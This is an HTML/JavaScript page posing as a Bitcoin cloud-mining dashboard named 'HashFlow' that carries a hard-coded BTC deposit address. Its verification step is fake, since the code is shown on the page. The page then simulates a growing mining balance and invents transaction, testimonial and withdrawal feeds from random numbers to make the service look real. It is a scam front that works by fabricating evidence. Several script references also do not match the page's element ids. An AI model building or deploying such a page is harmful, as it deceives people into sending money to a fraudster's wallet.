<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HashFlow BTC Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
:root{--bg:#0b0f1a;--card:#131a2e;--accent:#f2a900;--text:#fff;--ok:#00ff99;--warn:#ffcc66;}
[data-theme="light"]{--bg:#f2f3f7;--card:#fff;--text:#000;}
body{margin:0;font-family:Arial,sans-serif;background:var(--bg);color:var(--text);}
.card{max-width:95%;margin:16px auto;padding:18px;border-radius:12px;background:var(--card);}
h2{text-align:center;color:var(--accent);}
button,input,textarea{width:100%;padding:10px;border:none;border-radius:6px;margin-top:8px;}
button{background:var(--accent);font-weight:bold;cursor:pointer;}
.hidden{display:none;}
canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;}
.tx{display:flex;justify-content:space-between;border-bottom:1px solid #222;padding:6px 0;}
.badge{padding:2px 6px;border-radius:6px;font-size:11px;}
.confirmed{background:var(--ok);color:#000;}
.pending{background:var(--warn);color:#000;}
.stats{display:flex;justify-content:space-around;flex-wrap:wrap;}
.stats div{background:var(--bg);padding:8px;border-radius:8px;margin:5px;}
.btc-box{background:var(--bg);padding:10px;border-radius:8px;text-align:center;word-break:break-all;}
.tx-container{max-height:250px;overflow:hidden;}
.plan{border:1px solid #222;padding:15px;border-radius:10px;margin-top:10px;text-align:center;}
.toast{position:fixed;top:10px;right:10px;background:var(--accent);padding:10px;border-radius:8px;opacity:0;}
#topbar{display:none;position:fixed;top:0;left:0;right:0;background:#10162b;padding:10px;z-index:1000;display:flex;justify-content:space-between;}
#menu{display:none;position:fixed;top:50px;right:10px;background:var(--card);padding:10px;border-radius:10px;}
#menu div{padding:8px;cursor:pointer;}
</style>
</head>

<body data-theme="dark">

<div id="topbar">
  <div id="menuBtn">â˜°</div>
  <div id="usernameDisplay"></div>
</div>

<div id="menu">
  <div onclick="showSection('withdrawals')">Live Withdrawal Group</div>
  <div onclick="showSection('support')">Support</div>
  <div onclick="toggleTheme()">Toggle Theme</div>
  <div onclick="logout()">Logout</div>
</div>

<div class="card" id="loginCard">
  <h2>Verification Required</h2>
  <input id="contactInput" placeholder="Email or Phone">
  <button onclick="sendCode()">Get Code</button>
  <p id="codeDisplay" class="hidden">Code: <b id="generatedCode"></b></p>
  <input id="codeInput" class="hidden" placeholder="Enter code">
  <button id="submitCodeBtn" class="hidden" onclick="verifyCode()">Submit</button>
</div>

<div id="dashboard" class="hidden">

<div class="card">
<h2>BTC Deposit Address</h2>
<div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
<button onclick="copyAddress()">Copy Address</button>
</div>

<div class="card">
<h2>Mining Dashboard</h2>
<div id="balance">0.00000000 BTC</div>
<canvas id="chart"></canvas>
<div class="stats">
  <div>Hashrate: 120 TH/s</div>
  <div>Blocks: <span id="blocks">0</span></div>
  <div>Uptime: <span id="uptime">0h 0m</span></div>
</div>
</div>

<div class="card">
<h2>Recent Activity</h2>
<div class="tx-container" id="txs"></div>
</div>

<div class="card">
<h2>Live Testimonials</h2>
<div id="testimonialFeed"></div>
</div>

<div class="card hidden" id="withdrawals">
<h2>Live Withdrawal Group</h2>
<div id="feed"></div>
</div>

<div class="card hidden" id="support">
<h2>Support</h2>
<textarea placeholder="Write message..."></textarea>
<button>Send</button>
</div>

</div>

<div id="toast" class="toast"></div>

<script>
menuBtn.onclick=()=>menu.style.display=menu.style.display==='block'?'none':'block';

function showSection(id){
  document.querySelectorAll('.card').forEach(c=>{
    if(['withdrawals','support'].includes(c.id)) c.classList.add('hidden');
  });
  document.getElementById(id).classList.remove('hidden');
  menu.style.display='none';
}

function toggleTheme(){
  document.body.dataset.theme =
  document.body.dataset.theme==='dark'?'light':'dark';
}

function logout(){localStorage.clear();location.reload();}

let generatedCode='',userContact='';
function sendCode(){
  userContact=contactInput.value.trim();
  if(!userContact)return alert('Enter contact');
  generatedCode=Math.floor(100000+Math.random()*900000);
  generatedCodeEl.innerText=generatedCode;
  codeDisplay.classList.remove('hidden');
  codeInput.classList.remove('hidden');
  submitCodeBtn.classList.remove('hidden');
}

function verifyCode(){
  if(codeInput.value!=generatedCode)return alert('Wrong code');
  localStorage.setItem('verified',userContact);
  enterDashboard();
}

function enterDashboard(){
  loginCard.style.display='none';
  dashboard.classList.remove('hidden');
  topbar.style.display='flex';
  usernameDisplay.innerText=userContact;
  startMining();
}

if(localStorage.getItem('verified')){
  userContact=localStorage.getItem('verified');
  enterDashboard();
}

function copyAddress(){
  navigator.clipboard.writeText(btcAddress.innerText);
  toast('Address copied');
}

function toast(msg){
  toastEl.innerText=msg;
  toastEl.style.opacity=1;
  setTimeout(()=>toastEl.style.opacity=0,3000);
}

function startMining(){
const canvas=document.getElementById('chart');
const ctx=canvas.getContext('2d');
let points=[0],balance=0,blocks=0,minutes=0;
const rate=0.00000002;

setInterval(()=>{
  balance+=rate;
  balanceEl.innerText=balance.toFixed(8)+' BTC';
  points.push(balance);
  if(points.length>40)points.shift();
  ctx.clearRect(0,0,canvas.width,canvas.height);
  ctx.beginPath();
  points.forEach((p,i)=>{
    const x=i*(canvas.width/40);
    const y=canvas.height-(p*canvas.height*5000);
    i?ctx.lineTo(x,y):ctx.moveTo(x,y);
  });
  ctx.strokeStyle='#f2a900';
  ctx.stroke();
},1000);

setInterval(()=>{
  blocks+=Math.floor(Math.random()*2);
  minutes++;
  blocksEl.innerText=blocks;
  uptimeEl.innerText=`${Math.floor(minutes/60)}h ${minutes%60}m`;
},60000);

setInterval(()=>{
  const d=document.createElement('div');
  const v=(Math.random()*0.0005).toFixed(8);
  d.innerHTML=`<span>+${v} BTC</span><span class="badge confirmed">Completed</span>`;
  txs.prepend(d);
  if(txs.children.length>100)txs.lastChild.remove();
},1500);

setInterval(()=>{
  const d=document.createElement('div');
  d.innerText=`âœ… User withdrew ${(Math.random()*0.01).toFixed(4)} BTC`;
  testimonialFeed.prepend(d);
},3000);

setInterval(()=>{
  const d=document.createElement('div');
  d.innerText=`ðŸ’¸ Withdrawal ${(Math.random()*0.02).toFixed(4)} BTC processed`;
  feed.prepend(d);
},2500);
}
</script>

</body>
  </html>
